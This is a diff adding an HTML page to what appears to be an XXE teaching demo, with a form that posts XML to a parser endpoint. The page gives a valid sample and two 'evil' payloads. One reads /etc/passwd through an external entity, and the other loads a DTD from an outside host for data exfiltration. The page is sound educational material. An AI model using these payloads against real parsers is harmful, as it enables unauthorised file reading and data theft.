@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>XXE Example</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="node_modules/bootstrap/dist/css/bootstrap.min.css">
+</head>
+<body>
+
+<main class="container">
+
+    <h1>XXE (XML External Entity) Attacks</h1>
+
+
+    <form action="/app/xml-parser" method="get">
+        <div class="form-group">
+            <textarea name="input" placeholder="Enter some XML" class="form-control" rows="5"></textarea>
+        </div>
+        <input type="submit" class="btn btn-primary">
+    </form>
+
+</main>
+
+<div class="container-fluid">
+    <div class="row">
+        <div class="col">
+            <h2>Valid XML</h2>
+
+<pre>
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;ascii&quot; ?&gt;
+&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;]&gt;
+&lt;foo&gt;demo&lt;/foo&gt;
+</pre>
+
+            <p>A perfectly valid XML with embedded DTD</p>
+        </div>
+        <div class="col">
+            <h2>Evil XML</h2>
+
+<pre>
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE name [&lt;!ENTITY x SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
+&lt;name&gt;&amp;x;&lt;/name&gt;
+</pre>
+            <p>An evil XML whose DTD will read contents of the <code>/etc/passwd</code> file</p>
+        </div>
+        <div class="col">
+            <h2>Evil XML</h2>
+<pre>
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot; ?&gt;
+&lt;!DOCTYPE pk SYSTEM &quot;http://target1.krvtz.net/aa.dtd&quot;&gt;
+&lt;pk&gt;&amp;author; &amp;attack;&lt;/pk&gt;
+</pre>
+            <p>Even more evil example with an externally hosted DTD that also allow exfiltration of data</p>
+        </div>
+    </div>
+
+</div>
+
+
+<footer class="footer">
+    <div class="container">
+        <a href="index.html">Back to main</a>
+    </div>
+</footer>
+</body>
+</html>
